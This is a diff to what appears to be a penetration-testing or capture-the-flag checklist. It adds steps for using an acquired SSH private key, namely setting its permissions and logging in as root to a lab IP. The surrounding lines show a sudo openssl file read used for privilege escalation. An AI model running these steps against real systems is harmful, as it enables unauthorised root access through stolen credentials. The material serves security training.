@@ -162,6 +162,9 @@ run
   #Run the Command
   sudo /usr/bin/openssl enc -in $LFILE
 
+  #Aquired SSH Key? Proceed down to:
+  chmod 600 id_rsa
+
   
   #Upgrade Shell for ease of use
   /bin/bash
@@ -191,6 +194,8 @@ run
 
   #Log in as root or user
   ssh -i id_rsa root@<Target IP>
+  #or Full file path
+  ssh -i ~/enterprise/keys/root_rsa root@10.129.252.125
   ```
 - [ ] **Check for authorized SSH keys or reuse**
   ```bash
